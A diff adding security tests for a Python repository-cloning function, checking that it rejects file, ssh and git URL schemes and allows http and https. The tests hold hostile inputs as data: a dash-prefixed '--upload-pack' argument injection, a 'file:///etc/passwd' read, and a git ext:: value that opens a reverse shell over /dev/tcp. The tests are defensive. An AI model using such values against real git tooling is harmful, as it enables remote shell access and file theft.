@@ -51,3 +51,42 @@ def test_clone_repo_auto_target(local_git_repo: str):
 def test_clone_repo_invalid_url_raises(tmp_path: Path):
     with pytest.raises(CloneError):
         clone_repo("https://invalid.example.com/no/repo.git", target_dir=tmp_path / "bad")
+
+
+# ── Security: scheme / injection tests ──────────────────────────────
+
+
+from agentit.cloner import _validate_repo_url
+
+
+def test_rejects_file_scheme():
+    with pytest.raises(CloneError):
+        clone_repo("file:///etc/passwd")
+
+
+def test_rejects_ssh_scheme():
+    with pytest.raises(CloneError):
+        clone_repo("ssh://git@github.com/org/repo")
+
+
+def test_rejects_git_scheme():
+    with pytest.raises(CloneError):
+        clone_repo("git://github.com/org/repo")
+
+
+def test_rejects_dash_prefix():
+    with pytest.raises(CloneError):
+        clone_repo("--upload-pack=evil")
+
+
+def test_rejects_ext_protocol():
+    with pytest.raises(CloneError):
+        clone_repo("ext::sh -i >& /dev/tcp/1.2.3.4/4242 0>&1")
+
+
+def test_allows_https():
+    _validate_repo_url("https://github.com/org/repo.git")
+
+
+def test_allows_http():
+    _validate_repo_url("http://github.com/org/repo.git")
